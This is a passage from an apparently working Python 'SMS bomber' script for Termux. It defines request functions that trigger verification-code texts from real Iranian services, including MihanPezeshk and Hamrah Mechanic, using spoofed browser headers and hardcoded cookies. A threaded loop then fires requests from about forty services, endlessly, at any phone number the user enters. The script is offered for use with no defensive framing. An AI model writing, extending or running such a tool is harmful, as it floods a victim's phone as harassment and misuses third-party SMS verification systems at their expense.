'referer': 'https://www.mihanpezeshk.com/confirmcodePatient',
'upgrade-insecure-requests': '1',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        gaR = post(url=gaU, headers=gaH, data=gaD)
        print(f'{g}(MihanPezeshk) {w}Code Was Sent')
        return True
    except:
        pass
def mek(phone):
    meU = 'https://www.hamrah-mechanic.com/api/v1/auth/login'
    meH = {
"Accept": "application/json",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "en-US,en;q=0.5",
"Connection": "keep-alive",
"Content-Type": "application/json",
"Cookie": "_ga=GA1.2.1307952465.1641249170; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=2527d893-9de1-8fee-9f73-d666992dd3d5; _yngt=9d6ba2d2-fd1c-4dcc-9f77-e1e364af4434; _hjSessionUser_619539=eyJpZCI6IjcyOTJiODRhLTA2NGUtNTA0Zi04Y2RjLTA2MWE3ZDgxZDgzOSIsImNyZWF0ZWQiOjE2NDEyNDkxNzEzMTUsImV4aXN0aW5nIjp0cnVlfQ==; _gid=GA1.2.284804399.1642278349; _gat_gtag_UA_106934660_1=1; _gat_UA-0000000-1=1; analytics_session_token=238e3f23-aff7-8e3a-f1d4-ef4f6c471e2b; yektanet_session_last_activity=1/15/2022; _yngt_iframe=1; _gat_UA-106934660-1=1; _hjIncludedInSessionSample=0; _hjSession_619539=eyJpZCI6IjRkY2U2ODUwLTQzZjktNGM0Zi1iMWUxLTllY2QzODA3ODhiZCIsImNyZWF0ZWQiOjE2NDIyNzgzNTYzNjgsImluU2FtcGxlIjpmYWxzZX0=; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=0",
"Host": "www.hamrah-mechanic.com",
"Origin": "https://www.hamrah-mechanic.com",
"Referer": "https://www.hamrah-mechanic.com/membersignin/",
"Source": "web",
"TE": "trailers",
"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
}
    meD = {
	"landingPageUrl": "https://www.hamrah-mechanic.com/",
	"orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
	"phoneNumber": "0"+phone.split("+98")[1],
	"prevDomainUrl": None,
	"prevUrl": None,
	"referrer": "https://www.google.com/"
}
    try:
        meR = post(url=meU, headers=meH, data=meD).json()
        if meR['isSuccess']:
            print(f'{g}(HamrahMechanic) {w}Code Was Sent')
            return True
    except: pass
# ================================[SEND SMS FUNC]================================
def is_phone(phone: str):
    phone = sub("\s+", "" ,phone.strip())
    if match(r"^\+989[0-9]{9}$", phone):
        return phone
    elif match(r"^989[0-9]{9}$", phone):
        return f"+{phone}"
    elif match(r"^09[0-9]{9}$", phone):
        return f"+98{phone[1::]}"
    elif match(r"^9[0-9]{9}$", phone):
        return f"+98{phone}"
    else:
        return False

def printLow(Str):
    for char in Str:
        print(char, end='', flush=True)
        sleep(.01)
def start(x: int, S: str):
    if active_count() < x:
        exec(S)
r='\033[1;31m'
g='\033[32;1m' 
y='\033[1;33m'
w='\033[1;37m'
printLow(f'{r}Termux Script\n\n{y}Info:\n    {g}[+] {y}GitHub account: {w}NiREvil \n    {g}[+] {y}Telegram Channel: {w}@F_NiREvil\n   \n{y}system:\n    {g}[+] {y}Platform: {w}{System}\n    {g}[+] {y}Node: {w}{Node}\n    {g}[+] {y}Release: {w}{Release}\n\n')
def Vip(phone, Time):
    Thread(target=snap, args=[phone]).start(), sleep(Time)
    Thread(target=gap, args=[phone]).start(), sleep(Time)
    Thread(target=tap30, args=[phone]).start(), sleep(Time)
    Thread(target=divar, args=[phone]).start(), sleep(Time)
    Thread(target=torob, args=[phone]).start(), sleep(Time)
    Thread(target=snapfood, args=[phone]).start(), sleep(Time)
    Thread(target=sheypoor, args=[phone]).start(), sleep(Time)
    Thread(target=alibaba, args=[phone]).start(), sleep(Time)
    Thread(target=smarket, args=[phone]).start(), sleep(Time)
    Thread(target=sTrip, args=[phone]).start(), sleep(Time)
    Thread(target=drdr, args=[phone]).start(), sleep(Time)
    Thread(target=filmnet, args=[phone]).start(), sleep(Time)
    Thread(target=itool, args=[phone]).start(), sleep(Time)    
    Thread(target=anar, args=[phone]).start(), sleep(Time)
    Thread(target=azki, args=[phone]).start(), sleep(Time)
    Thread(target=nobat, args=[phone]).start(), sleep(Time)
    Thread(target=bn, args=[phone]).start(), sleep(Time)
    Thread(target=baskol, args=[phone]).start(), sleep(Time)
    Thread(target=basalam, args=[phone]).start(), sleep(Time)
    Thread(target=ghabzino, args=[phone]).start(), sleep(Time)
    Thread(target=okorosh, args=[phone]).start(), sleep(Time)
    Thread(target=bimito, args=[phone]).start(), sleep(Time)
    Thread(target=gapfilm, args=[phone]).start(), sleep(Time)
    Thread(target=bimitoVip, args=[phone]).start(), sleep(Time)    
    Thread(target=seebirani, args=[phone]).start(), sleep(Time)
    Thread(target=limome, args=[phone]).start(), sleep(Time)
    Thread(target=binjo, args=[phone]).start(), sleep(Time)
    Thread(target=kilid, args=[phone]).start(), sleep(Time)
    Thread(target=didnegar, args=[phone]).start(), sleep(Time)
    Thread(target=olgoo, args=[phone]).start(), sleep(Time)
    Thread(target=chmdon, args=[phone]).start(), sleep(Time) 
    Thread(target=drsaina, args=[phone]).start(), sleep(Time)
    Thread(target=see5, args=[phone]).start(), sleep(Time)
    Thread(target=simkhanT, args=[phone]).start(), sleep(Time)
    Thread(target=simkhanF, args=[phone]).start(), sleep(Time)
    Thread(target=lendo, args=[phone]).start(), sleep(Time)
    Thread(target=pakhsh, args=[phone]).start(), sleep(Time)
    Thread(target=mihanpezeshk, args=[phone]).start(), sleep(Time)
    Thread(target=mek, args=[phone]).start(), sleep(Time)
while True:
    phone = is_phone(input(f'{g}[?] {y}Enter Phone Number {g}(+98) {r}- {w}'))
    if phone:
        break
try:
    Time = float(input(f'{g}[?] {y}Enter Sleep Time Between Requests {g}[Defult=0.1] {r}- {w}'))
except ValueError:
    Time = 0.1
    print(f"{g}[0.1] {w}Used")
while True:
    try: Vip(phone, Time)
    except KeyboardInterrupt: exit(f'{r}[-] User Exited')
    except: print(f'{r}[-] Error TimeOut')
